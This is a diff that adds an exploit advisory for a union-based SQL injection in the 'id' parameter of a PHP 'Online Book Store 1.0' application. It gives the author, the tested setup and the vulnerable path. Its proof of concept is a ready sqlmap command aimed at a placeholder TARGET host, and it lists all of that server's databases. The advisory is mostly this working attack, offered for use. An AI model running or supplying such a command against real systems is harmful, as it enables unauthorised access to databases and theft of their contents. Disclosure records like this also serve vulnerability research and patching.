@@ -1,0 +1,12 @@
+# Title: Online Book Store 1.0 - 'id' SQL Injection
+# Exploit Author: Moaaz Taha (0xStorm)
+# Date: 2020-08-21
+# Vendor Homepage: https://www.sourcecodester.com/php/14383/online-book-store.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14383&title=Online+Book+Store
+# Version: 1.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 3.2.4
+# Description
+This parameter "id" is vulnerable to Union-Based blind SQL injection in this path "/online%20book%20store/detail.php?id=44" that leads to retrieve all databases.
+
+#POC
+sqlmap -u "http://TARGET/online%20book%20store/detail.php?id=44" -p id --dbms=mysql --threads=10 --technique=U --dbs
